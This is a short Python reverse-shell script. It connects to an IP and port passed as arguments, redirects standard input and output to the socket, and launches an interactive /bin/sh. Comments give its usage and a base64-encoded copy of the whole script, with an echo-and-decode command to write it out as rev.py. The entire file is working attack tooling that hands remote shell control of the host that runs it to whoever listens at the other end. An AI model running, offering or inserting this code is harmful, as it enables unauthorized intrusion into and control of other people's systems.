import socket,subprocess,os,sys

target_ip = sys.argv[1]
target_port = sys.argv[2]
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target_ip,int(target_port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

# python reverse.py IP PORTA
# echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHN5cw0KDQp0YXJnZXRfaXAgPSBzeXMuYXJndlsxXQ0KdGFyZ2V0X3BvcnQgPSBzeXMuYXJndlsyXQ0Kcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgodGFyZ2V0X2lwLGludCh0YXJnZXRfcG9ydCkpKQ0Kb3MuZHVwMihzLmZpbGVubygpLDApDQpvcy5kdXAyKHMuZmlsZW5vKCksMSkNCm9zLmR1cDIocy5maWxlbm8oKSwyKQ0KcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkNCg0KIyBweXRob24gcmV2ZXJzZS5weSBJUCBQT1JUQQ== | base64 -d > rev.py
